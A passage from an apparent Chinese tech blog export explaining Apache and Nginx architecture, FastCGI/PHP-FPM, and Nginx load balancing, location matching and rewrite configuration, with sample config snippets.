|+&gt;| 子进程初始化 | | | +------+------+ +-------+------+ +-------+------+ | +--------------------------------------------------------------+ | | | | 运行阶段 | | +----v----+ +----v----+ +----v----+ | | | 请求循环 | | 请求循环 | | 请求循环 | | | +----+----+ +----+----+ +----+----+ | | | | | | | +------v------+ +------v------+ +------v------+ | | | 子进程结束 | | 子进程结束 | | 子进程结束 | | | +-------------+ +-------------+ +-------------+ | +--------------------------------------------------------------+ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个生命周期是在perfork工作下的示意，从图中可以看出，Apache对于每一个请求都要启动一个单独的进程来处理。 Apache的工作模式 prefork的工作原理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个单独的控制进程(父进程)负责产生子进程，这些子进程用于监听请求并作出应答。Apache总是试图保持一些备用的 (spare)或是空闲的子进程用于迎接即将到来的请求。这样客户端就无需在得到服务前等候子进程的产生。在Unix系统中，父进程通常以root身份运行以便邦定80端口，而 Apache产生的子进程通常以一个低特权的用户运行。User和Group指令用于配置子进程的低特权用户。运行子进程的用户必须要对他所服务的内容有读取的权限，但是对服务内容之外的其他资源必须拥有尽可能少的权限。 worker的工作原理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每个进程能够拥有的线程数量是固定的。服务器会根据负载情况增加或减少进程数量。一个单独的控制进程(父进程)负责子进程的建立。每个子进程能够建立ThreadsPerChild数量的服务线程和一个监听线程，该监听线程监听接入请求并将其传递给服务线程处理和应答。Apache总是试图维持一个备用(spare)或是空闲的服务线程池。这样，客户端无须等待新线程或新进程的建立即可得到处理。在Unix中，为了能够绑定80端口，父进程一般都是以root身份启动，随后，Apache以较低权限的用户建立子进程和线程。User和Group指令用于配置Apache子进程的权限。虽然子进程必须对其提供的内容拥有读权限，但应该尽可能给予他较少的特权。另外，除非使用了suexec ，否则，这些指令配置的权限将被CGI脚本所继承。 Apache的运行 启动阶段&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在启动阶段，Apache主要进行配置文件解析(例如http.conf以及Include指令设定的配置文件等)、模块加载(例如modphp.so,modperl.so等)和系统资源初始化（例如日志文件、共享内存段等）工作。在这个阶段，Apache为了获得系统资源最大的使用权限，将以特权用户root（X系统）或超级管理员administrator(Windows系统)完成启动。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个过程可以通过下图来深入了解： 12345678910111213141516171819"text"&gt; +--------+ | 开始 | +----+---+ | +----------v------------+ 解析主配置文件http.conf中配置信息， | 解析配置文件 | 像LoadModule, AddType +----------+------------+ 等指令被加载至内存 | +----------v------------+ 依据AddModule, LoadModule等指令 | 加载静态/动态模块 | 加载Apache模块，像mod_php5.so被 +----------+------------+ 加载至内存，映射到Apache地址空间。 | +----------v------------+ 日志文件、共享内存段，数据库链接 | 系统资源初始化 | 等初始化 +----------+------------+ | +---v----+ | 结束 | +--------+ 运行阶段&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在运行阶段，Apache主要工作是处理用户的服务请求。在这个阶段，Apache放弃特权用户级别，使用普通权限，这主要是基于安全性的考虑，防止由于代码的缺陷引起的安全漏洞。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于Apache的Hook机制，Apache 允许模块(包括内部模块和外部模块，例如mod_php5.so,mod_perl.so等)将自定义的函数注入到请求处理循环中。mod_php5.so/php5apache2.dll就是将所包含的自定义函数，通过Hook机制注入到Apache中，在Apache处理流程的各个阶段负责处理php请求。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Apache将请求处理循环分为11个阶段，依次是：Post-Read-Request，URI Translation，Header Parsing，Access Control，Authentication，Authorization，MIME Type Checking，FixUp，Response，Logging，CleanUp。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Apache处理http请求的生命周期: Post-Read-Request阶段:在正常请求处理流程中，这是模块可以插入钩子的第一个阶段。对于那些想很早进入处理请求的模块来说，这个阶段可以被利用。 URI Translation阶段 : Apache在本阶段的主要工作：将请求的URL映射到本地文件系统。模块可以在这阶段插入钩子，执行自己的映射逻辑。mod_alias就是利用这个阶段工作的。 Header Parsing阶段 : Apache在本阶段的主要工作：检查请求的头部。由于模块可以在请求处理流程的任何一个点上执行检查请求头部的任务，因此这个钩子很少被使用。mod_setenvif就是利用这个阶段工作的。 Access Control阶段 : Apache在本阶段的主要工作：根据配置文件检查是否允许访问请求的资源。Apache的标准逻辑实现了允许和拒绝指令。modauthzhost就是利用这个阶段工作的。 Authentication阶段 : Apache在本阶段的主要工作：按照配置文件设定的策略对用户进行认证，并设定用户名区域。模块可以在这阶段插入钩子，实现一个认证方法。 Authorization阶段 : Apache在本阶段的主要工作：根据配置文件检查是否允许认证过的用户执行请求的操作。模块可以在这阶段插入钩子，实现一个用户权限管理的方法。 MIME Type Checking阶段 : Apache在本阶段的主要工作：根据请求资源的MIME类型的相关规则，判定将要使用的内容处理函数。标准模块modnegotiation和modmime实现了这个钩子。 FixUp阶段 : 这是一个通用的阶段，允许模块在内容生成器之前，运行任何必要的处理流程。和PostReadRequest类似，这是一个能够捕获任何信息的钩子，也是最常使用的钩子。 Response阶段 : Apache在本阶段的主要工作：生成返回客户端的内容，负责给客户端发送一个恰当的回复。这个阶段是整个处理流程的核心部分。 Logging阶段 : Apache在本阶段的主要工作：在回复已经发送给客户端之后记录事务。模块可能修改或者替换Apache的标准日志记录。 CleanUp阶段 : Apache在本阶段的主要工作：清理本次请求事务处理完成之后遗留的环境，比如文件、目录的处理或者Socket的关闭等等，这是Apache一次请求处理的最后一个阶段。 Nginx 概述&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nginx（发音同engine x）是一款由俄罗斯程序员Igor Sysoev所开发轻量级的网页服务器、反向代理服务器以及电子邮件（IMAP/POP3）代理服务器。起初是供俄国大型的门户网站及搜索引擎Rambler（俄语：Рамблер）使用。 – 维基百科 Nginx的模块与工作原理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nginx由内核和模块组成，其中，内核的设计非常微小和简洁，完成的工作也非常简单，仅仅通过查找配置文件将客户端请求映射到一个location block（location是Nginx配置中的一个指令，用于URL匹配），而在这个location中所配置的每个指令将会启动不同的模块去完成相应的工作。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nginx的模块从结构上分为核心模块、基础模块和第三方模块： 核心模块：HTTP模块、EVENT模块和MAIL模块 基础模块：HTTP Access模块、HTTP FastCGI模块、HTTP Proxy模块和HTTP Rewrite模块， 第三方模块：HTTP Upstream Request Hash模块、Notice模块和HTTP Access Key模块。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nginx的模块从功能上分为如下三类: Handlers（处理器模块）。此类模块直接处理请求，并进行输出内容和修改headers信息等操作。Handlers处理器模块一般只能有一个。 Filters （过滤器模块）。此类模块主要对其他处理器模块输出的内容进行修改操作，最后由Nginx输出。 Proxies （代理类模块）。此类模块是Nginx的HTTP Upstream之类的模块，这些模块主要与后端一些服务比如FastCGI等进行交互，实现服务代理和负载均衡等功能。 123456789101112131415161718"text"&gt; + ^ Http Request | | Http Response | | +---------+------v-----+ +----+----+ | Conf | Nginx Core | | FilterN | +---------+------+-----+ +----^----+ | | | +----+----+ | | Filter2 |choose a handler | +----^----+based conf | | | +----+----+ | | Filter1 | | +----^----+ | | Generate content +-----v--------------------+----+ | Handler | +-------------------------------+ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nginx本身做的工作实际很少，当它接到一个HTTP请求时，它仅仅是通过查找配置文件将此次请求映射到一个location block，而此location中所配置的各个指令则会启动不同的模块去完成工作，因此模块可以看做Nginx真正的劳动工作者。通常一个location中的指令会涉及一个handler模块和多个filter模块（当然，多个location可以复用同一个模块）。handler模块负责处理请求，完成响应内容的生成，而filter模块对响应内容进行处理。 Nginx架构及工作流程 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上图是Nginx的架构，这个架构类似于Apache的Worker工作状态，Nginx的每一个Worker进程都管理着大量的线程，真正处理请求的是Worker之下的线程。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所有实际上的业务处理逻辑都在worker进程。worker进程中有一个函数，执行无限循环，不断处理收到的来自客户端的请求，并进行处理，直到整个nginx服务被停止。Worker中这个函数执行内容如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;操作系统提供的机制（例如epoll, kqueue等）产生相关的事件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;接收和处理这些事件，如是接受到数据，则产生更高层的request对象。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;处理request的header和body。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;产生响应，并发送回客户端。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;完成request的处理。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重新初始化定时器及其他事件。 Nginx和FastCGI FastCGI&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FastCGI是一个可伸缩地、高速地在HTTP server和动态脚本语言间通信的接口。多数流行的HTTP server都支持FastCGI，包括Apache、Nginx和lighttpd等。同时，FastCGI也被许多脚本语言支持，其中就有PHP。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FastCGI是从CGI发展改进而来的。传统CGI接口方式的主要缺点是性能很差，因为每次HTTP服务器遇到动态程序时都需要重新启动脚本解析器来执行解析，然后将结果返回给HTTP服务器。这在处理高并发访问时几乎是不可用的。另外传统的CGI接口方式安全性也很差，现在已经很少使用了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FastCGI接口方式采用C/S结构，可以将HTTP服务器和脚本解析服务器分开，同时在脚本解析服务器上启动一个或者多个脚本解析守护进程。当HTTP服务器每次遇到动态程序时，可以将其直接交付给FastCGI进程来执行，然后将得到的结果返回给浏览器。这种方式可以让HTTP服务器专一地处理静态请求或者将动态脚本服务器的结果返回给客户端，这在很大程度上提高了整个应用系统的性能。 Nging和FastCGI合作&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nginx不支持对外部程序的直接调用或者解析，所有的外部程序（包括PHP）必须通过FastCGI接口来调用。FastCGI接口在Linux下是socket（这个socket可以是文件socket，也可以是ip socket）。接下来以Nginx下PHP的运行过程来说明。PHP-FPM是管理FastCGI的一个管理器，它作为PHP的插件存在。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FastCGI进程管理器php-fpm自身初始化，启动主进程php-fpm和启动start_servers个CGI 子进程。主进程php-fpm主要是管理fastcgi子进程，监听9000端口。fastcgi子进程等待来自Web Server的连接。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当客户端请求到达Web Server Nginx是时，Nginx通过location指令，将所有以php为后缀的文件都交给127.0.0.1:9000来处理，即Nginx通过location指令，将所有以php为后缀的文件都交给127.0.0.1:9000来处理。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FastCGI进程管理器PHP-FPM选择并连接到一个子进程CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FastCGI子进程完成处理后将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FastCGI子进程接着等待并处理来自FastCGI进程管理器（运行在 WebServer中）的下一个连接。 Apache和Nginx比较 功能对比 Nginx和Apache一样，都是HTTP服务器软件，在功能实现上都采用模块化结构设计，都支持通用的语言接口，如PHP、Perl、Python等，同时还支持正向和反向代理、虚拟主机、URL重写、压缩传输、SSL加密传输等。 在功能实现上，Apache的所有模块都支持动、静态编译，而Nginx模块都是静态编译的， 对FastCGI的支持，Apache对Fcgi的支持不好，而Nginx对Fcgi的支持非常好； 在处理连接方式上，Nginx支持epoll，而Apache却不支持； 在空间使用上，Nginx安装包仅仅只有几百K，和Nginx比起来Apache绝对是庞然大物。 Nginx相对Apache的优点 轻量级，同样起web 服务，比apache 占用更少的内存及资源 静态处理，Nginx 静态处理性能比 Apache 高 3倍以上 抗并发，nginx 处理请求是异步非阻塞的，而apache则是阻塞型的，在高并发下nginx 能保持低资源低消耗高性能。在Apache+PHP（prefork）模式下，如果PHP处理慢或者前端压力很大的情况下，很容易出现Apache进程数飙升，从而拒绝服务的现象。 高度模块化的设计，编写模块相对简单 社区活跃，各种高性能模块出品迅速啊 Apache相对Nginx的优点 ;rewrite，比nginx 的rewrite 强大 模块超多，基本想到的都可以找到 少bug，nginx的bug相对较多 超稳定 Apache对PHP支持比较简单，Nginx需要配合其他后端用 选择Nginx的优势所在 作为Web服务器: Nginx处理静态文件、索引文件，自动索引的效率非常高。 作为代理服务器，Nginx可以实现无缓存的反向代理加速，提高网站运行速度。 作为负载均衡服务器，Nginx既可以在内部直接支持Rails和PHP，也可以支持HTTP代理服务器对外进行服务，同时还支持简单的容错和利用算法进行负载均衡。 在性能方面，Nginx是专门为性能优化而开发的，在实现上非常注重效率。它采用内核Poll模型(epoll and kqueue )，可以支持更多的并发连接，最大可以支持对50 000个并发连接数的响应，而且只占用很低的内存资源。 在稳定性方面，Nginx采取了分阶段资源分配技术，使得CPU与内存的占用率非常低。Nginx官方表示，Nginx保持10 000个没有活动的连接，而这些连接只占用2.5MB内存，因此，类似DOS这样的攻击对Nginx来说基本上是没有任何作用的。 在高可用性方面，Nginx支持热部署，启动速度特别迅速，因此可以在不间断服务的情况下，对软件版本或者配置进行升级，即使运行数月也无需重新启动，几乎可以做到7×24小时不间断地运行。 同时使用Nginx和Apache&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于Nginx和Apache各自的优势，现在很多人选择了让两者在服务器中共存。在服务器端让Nginx在前，Apache在后。由Nginx做负载均衡和反向代理，并且处理静态文件，讲动态请求（如PHP应用）交给Apache去处理。]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx的负载均衡和反向代理]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F31.%20nginx%E7%9A%84%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E9%9B%86%E7%BE%A4%2F</url>
    <content type="text"><![CDATA[nginx的负载均衡集群&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;之前提到过的 nginx 的负载均衡功能，实际上和 nginx 的代理是同一个功能，只是把之前代理一台机器改为代理多台机器而已。 nginx 的负载均衡和 lvs 相比， nginx 属于更该机的应用层，不牵扯到 IP 和内核的改动， 它只是单纯地把用户的请求转发到后面的机器上，这就意味着，后端的 RS 不需要配置公网 IP。 1.环境说明 nginx 分发器（一个公网 ip 192.168.119.110 和一个内网 ip 192.168.0.67） RS1 只有内网 ip（192.168.0.66） RS2 只有内网 ip（192.168.0.65） 2.配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 nginx 分发器上编辑配置文件 1[root@dir ~]# vim /usr/local/nginx/conf/vhosts/lb.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容 123456789101112131415upstream test &#123; ip_hash; server 192.168.0.66; server 192.168.0.65;&#125; server &#123; listen 80; server_name bbs.aaa.cn; location / &#123; proxy_pass http://test/; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：这个配置和 nginx 代理配置如出一辙，只是多了一个 upstream ，这个 upstream 用来定义后端的 RS ，可以只写一个。 ip_hash 为 nginx 的一种调度算法，加上这一行会达到这样的效果，即一个用户的请求会适中被分发到固定的一个 RS 上。这样的好处是，可以避免同一个用户的请求分发到不同的机器上而导致 session 丢失的情况。 upstream 里面，RS 后面的 ip 后面还可以加权重，比如 “server 192.168.0.66 weight=100;”。还有一点要注意， upstream 后面的 test 是自定义的一个名字，可以随便写，唯一的要求是要和 proxy_pass 后面保持一致。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;针对目录参考nginx代理–根据访问的目录来区分后端的web]]></content>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx的负载均衡和反向代理]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F30.%20nginx%E7%9A%84%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%92%8C%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[nginx的负载均衡和反向代理负载均衡模块upstream： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nginx的负载均衡的算法： 轮询（默认） weight 权重轮询 ip_hash 每个请求按访问ip的hash结果分配，这样来自同一个ip的请求固定到后台的一段服务器上，有效的解决动态网页存在的session共享问题 fair 根据服务器的相应时间短来进行负载，需要安装nginx的upstream_fair模块 url_hash 根据url的hash结果分配，同一个url定向到同一后台服务器，提高缓存服务器的效率，需要安装nginx的hash包 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：当负载均衡的算法是ip_hash时，后端服务器的在负载均衡的调度中的状态不是weight和backup &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如： 12345upstream bakend &#123; ip_hash; server 192.168.0.14:88; server 192.168.0.15:80; &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;常用到的状态有： down， 表示server暂时不参与负载均衡 backup 备份机器 max_fails：应许请求失败的次数，默认为1，当超过最大次数是，返回proxy_next_upstream模块定义的错误 fail_timeout：经历了max_fails次失败后， 暂停服务的时间，max_fails可以和fail_timeout一起使用 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nginx对后端服务器的检查能力较弱，仅限于端口检查！ 反向代理模块proxy： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;proxy_pass:http:url1要和upstream模块的url1对应；否则没法实现； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;expires 过期时间：0为不过期 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面介绍http proxy模块中的相关指令： 1proxy_next_upstream &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;语法： 1proxy_next_upstream [error|timeout|invalid_header|http_500|http_502|http_503|http_504|http_404|off] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;确定在何种情况下请求将转发到下一个服务器。转发请求只发生在没有数据传递到客户端的过程中。 max_fails 允许请求失败的次数默认为1。当超过最大次数时，返回proxy_next_upstream 模块定义的错误 proxy_connecttimeout 后端服务器连接的超时时间发起握手等候响应超时时间 proxy_readtimeout 连接成功后等候后端服务器响应时间_其实已经进入后端的排队之中等候处理（也可以说是后端服务器处理请求的时间） proxy_sendtimeout 后端服务器数据回传时间就是在规定时间之内后端服务器必须传完所有的数据 proxy_pass 这个指令设置被代理服务器的地址和被映射的URI]]></content>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx中location的规则]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F29.%20nginx%E4%B8%ADlocation%E7%9A%84%E8%A7%84%E5%88%99%2F</url>
    <content type="text"><![CDATA[nginx中location的规则语法规则1location [=|~|~*|^~] /uri/ &#123; … &#125; = 开头表示精确匹配 ^~ 开头表示uri以某个常规字符串开头，不是正则匹配。#^~表示普通字符匹配，如果该选项匹配，只匹配该选项，不匹配别的选项，一般用来匹配目录。nginx不对url做编码，因此请求为/static/20%/aa，可以被规则^~ /static/ /aa匹配到（注意是空格）。 ~ 开头表示区分大小写的正则匹配 ~* 开头表示不区分大小写的正则匹配 !~和!~*分别为区分大小写不匹配及不区分大小写不匹配 的正则 / 通用匹配，任何请求都会匹配到。 @ #”@” 定义一个命名的 location，使用在内部定向时，例如 error_page, try_files如 error_page, try_files &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;多个location配置的情况下匹配顺序为： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先匹配 =，其次匹配^~, 其次是按文件中顺序的正则匹配，最后是交给 / 通用匹配。当有匹配成功时候，停止匹配，按当前匹配规则处理请求。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;”@”不能通过外部输入的url匹配~ 这个指正则匹配 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例子，有如下匹配规则： 123456789101112131415161718192021222324location = / &#123;精确匹配，必须是127.0.0.1/#规则A&#125;location = /login &#123;精确匹配，必须是127.0.0.1/login#规则B&#125;location ^~ /static/ &#123;非精确匹配，并且不区分大小写，比如127.0.0.1/static/js.#规则C&#125;location ~ .(gif|jpg|png|js|css)$ &#123;区分大小写，以gif,jpg,js结尾#规则D&#125;location ~* .png$ &#123;不区分大小写，匹配.png结尾的#规则E&#125;location !~ .xhtml$ &#123;区分大小写，匹配不已.xhtml结尾的#规则F&#125;location !~* .xhtml$ &#123;#规则G&#125;location / &#123;什么都可以#规则H&#125; 静态文件不记录日志，配置缓存1234567891011location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$&#123; expires 30d; access_log off;&#125;location ~ .*\.(js|css)$ &#123; expires 12h; access_log off;&#125;]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx的rewrite应用]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F24.%20Nginx%E7%9A%84rewrite%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Nginx的rewrite应用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Rewrite主要的功能是实现URL重写，Nginx 的 Rewrite 规则采用 PCRE Perl 兼容正则表达式的语法进行规则匹配，如相使用 Nginx 的 Rewrite 功能，在编译 Nginx 前要编译安装 PCRE 库。 一、Nginx使用if进行条件匹配&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nginx可以用if进行条件匹配，语法规则类似C 1if （条件）&#123;...&#125; ( 可用于： server,location ) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检查一个条件是否符合，如果条件符合，则执行大括号内的语句。不支持嵌套，不支持多条件 &amp;&amp; || &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如：if ($http_user_agent ~ MSIE) {rewrite ^(.*)$ /msie/$1 break;} 正则表达式匹配，其中： ~ 为区分大小写匹配 ~* 为不区分大小写匹配 !~和!~*分别为区分大小写不匹配及不区分大小写不匹配 文件及目录匹配，其中： -f和!-f用来判断是否存在文件 -d和!-d用来判断是否存在目录 -e和!-e用来判断是否存在文件或目录 -x和!-x用来判断文件是否可执行 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如：if (!-f $request_filename) {proxy_pass http://127.0.0.1;} &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Wordpress的重定向规则： 1if (!-e $request_filename) &#123;rewrite ^/(index|atom|rsd)\.xml$ http://feed.shunz.net last;rewrite ^([_0-9a-zA-Z-]+)?(/wp-.*) $2 last;rewrite ^([_0-9a-zA-Z-]+)?(/.*\.php)$ $2 last;rewrite ^ /index.php last;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;return ( 可用于： server,location,if ) ## 用于结束规则的执行并反回状态码给客户端。 状态码可以是 ：204/400/402~406/408/410/411/413/416/500~504 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如： 123location ~ .*\.(sh|bash)?$ &#123; return 403; &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;访问的 URL 以 .sh .bash 结尾的，则返回 403 。 204 No Content 400 Bad Request 402 Payment Required 403 Forbidden 404 Not Found 405 Method Not Allowed 406 Not Acceptable 408 Request Timeout 410 Gone 411 Length Required 413 Request Entity Too Large 416 Requested Range Not Satisfiable 500 Internal Server Error 501 Not Implemented 502 Bad Gateway 503 Service Unavailable 504 Gateway Timeout 二、Nginx使用rewrite&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rewrite ( 可用于： server,location,if ) ## 重写 URL ，或修改字符串。重写 URL 只对相对路径有效，如想对主机名，要使用 if 语句。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例1： 1234if ($host ~* www\.(.*)) &#123; set $host_without_www $1; rewrite ^(.*)$ http://$host_without_www$1 permanent; &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果替换串以 http:// 开头，将会采用 301 或 302 跳转进行 URL 重定向。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例2： 1rewrite ^/feed/$ http://feed.shunz.net last; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nginx的Rewrite规则与Apache几乎完全一致，所不同的是最后的flag标记，Nginx的rewrite指令后支持的标记有last，break，redirect，permanent last 相当于Apache里的[L]标记，表示完成rewrite，不再匹配后面的规则 break ( 可用于： server,location,if ) ## 本条规则匹配完成后，终止匹配，不再匹配后面的规则如：rewrite ^/b/(.*).html /play.php?video=$1 break; redirect 返回302临时重定向,浏览器会显示跳转后的URL地址 permanent 返回301永久重定向，浏览器会显示跳转后的URL地址 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;last/break用来实现URL重写，浏览器地址栏的URL不变，但在服务器端访问的路径发生了变化。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;redirect/permanent实现URL跳转，浏览器地址栏URL会显示跳转后的URL。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 alias 指令时必须用 last 标记 ，使用 proxy_pass 指令时要用 break 表示。 last 标记在本条 rewrite 规则执行完毕后，会对其所在 server{….}标签重新发起请 求，而 break 标记则在本条规则匹配完成后，终止匹配。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如： 1234location /cms/ &#123; proxy_pass http://test.abc.com; rewrite "^/cms/(.*)\.html$" /cms/index.html break; &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这条规则如果使用 last 会导致死循环。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般在根 location 中（即 location / {….}）或直接在 server 标签编写 rewrite 规则，推荐使用 last 标记， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在非根 location 中 (即 location /cms/ {…}),则使用 break 标记。 Nginx $document_uri参数的使用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$document_uri 表示访问的url 现在我的需求是，访问 www.abc.com 请求到 www.abc.com/abc/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在nginx配置文件中加入 1234if ($document_uri !~ 'abc') &#123; rewrite ^/(.*)$ http://www.abc.com/abc/$1 permanent; &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而不是单独加一句 rewrite ^/(.*)$ http://www.abc.com/abc/$1 permanent; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果只加rewrite 规则，而不限定条件，那么会造成死循环。 会访问到 http://www.abc.com/abc/abc/abc/abc/….]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx：承受3万并发连接数，胜过Apache 10倍]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F27.%20Nginx%EF%BC%9A%E6%89%BF%E5%8F%973%E4%B8%87%E5%B9%B6%E5%8F%91%E8%BF%9E%E6%8E%A5%E6%95%B0%EF%BC%8C%E8%83%9C%E8%BF%87Apache%2010%E5%80%8D%2F</url>
    <content type="text"><![CDATA[Nginx：承受3万并发连接数，胜过Apache 10倍&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nginx是目前比较重要的开源性负载均衡技术，新浪、网易、六间房等很多网站都将Nginx部署进自己的网站系统架构，并解决部分问题。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;本文是关于搭建“Nginx + PHP（FastCGI）”Web服务器的第4篇文章。本系列文章作为国内最早详细介绍 Nginx + PHP 安装、配置、使用的资料之一，为推动 Nginx 在国内的发展产生了积极的作用。 众网站纷纷重视Nginx&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是一篇关于Nginx 0.7.x系列版本的文章，安装、配置方式与第3篇文章相差不大，但配置参数有不同。Nginx 0.7.x系列版本虽然为开发版，但在很多大型网站的生产环境中已经使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nginx (“engine x”) 是一个高性能的 HTTP 和反向代理服务器，也是一个 IMAP/POP3/SMTP 代理服务器。 Nginx 是由 Igor Sysoev 为俄罗斯访问量第二的 Rambler.ru 站点开发的，它已经在该站点运行超过两年半了。Igor 将源代码以类BSD许可证的形式发布。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nginx 超越 Apache 的高性能和稳定性，使得国内使用 Nginx 作为 Web 服务器的网站也越来越多，其中包括新浪博客、新浪播客、网易新闻等门户网站频道，六间房、56.com等视频分享网站，Discuz!官方论坛、水木社区等知名论坛，豆瓣、YUPOO相册、海内SNS、迅雷在线等新兴Web 2.0网站。 Nginx：承受3万并发连接数，胜过Apache 10倍&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在高并发连接的情况下，Nginx是Apache服务器不错的替代品。Nginx同时也可以作为7层负载均衡服务器来使用。根据我的测试结果，Nginx 0.7.14 + PHP 5.2.6 (FastCGI) 可以承受3万以上的并发连接数，相当于同等环境下Apache的10倍。根据我的经验，4GB内存的服务器+Apache（prefork模式）一般只能处理3000个并发连接，因为它们将占用3GB以上的内存，还得为系统预留1GB的内存。我曾经就有两台Apache服务器，因为在配置文件中设置的MaxClients为4000，当Apache并发连接数达到3800时，导致服务器内存和Swap空间用满而崩溃。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而这台 Nginx 0.7.14 + PHP 5.2.6 (FastCGI) 服务器在3万并发连接下，开启的10个 